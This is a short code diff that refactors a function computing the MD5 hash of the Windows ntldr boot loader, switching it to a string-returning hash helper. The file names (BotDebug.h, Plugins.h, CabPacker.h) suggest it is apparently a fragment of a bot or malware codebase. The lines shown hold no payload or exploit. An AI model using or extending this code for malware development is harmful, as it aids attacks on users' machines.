@@ -5,6 +5,7 @@
 #include "CabPacker.h" 
 #include "Plugins.h"
 #include "Crypt.h"
+#include "md5.h"
 
 //----------------------------------------------------------------------------
 #include "BotDebug.h"
@@ -416,17 +417,13 @@ char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
 	m_lstrcat(path, "ntldr");
 
 	m_memset(Buffer, 0, BufferSize);
-	char* md5 = CalcFileMD5Hash(path);
 
-	if (md5 == NULL) return NULL;
+	string md5 = CalcFileMD5Hash(path);
+
+	if (md5.IsEmpty()) return NULL;
 	if (BufferSize < 33) return NULL;
 
-	for (size_t i = 0; i < 16; i++)
-	{
-		char ByteBuffer[10];
-		DbgRptSprintfA(ByteBuffer, "%02X", (BYTE)md5[i]);
-		m_lstrcat(Buffer, ByteBuffer);
-	}
+  	m_lstrcat(Buffer, md5.t_str());
 
 	return Buffer;
 }
